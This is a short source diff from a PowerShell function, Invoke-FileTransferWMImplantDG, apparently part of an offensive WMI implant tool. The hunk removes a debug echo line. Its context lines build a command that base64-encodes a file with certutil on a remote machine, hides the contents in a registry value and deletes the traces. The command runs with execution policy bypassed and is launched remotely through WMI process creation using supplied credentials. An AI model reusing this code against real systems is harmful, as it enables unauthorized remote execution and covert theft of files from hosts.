@@ -4376,8 +4376,6 @@ function Invoke-FileTransferWMImplantDG
             $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fct -PropertyType String -Force; del ''' + "$temp_path + '''"
             $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
 
-            $remote_command
-
             if($Creds)
             {
                 Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
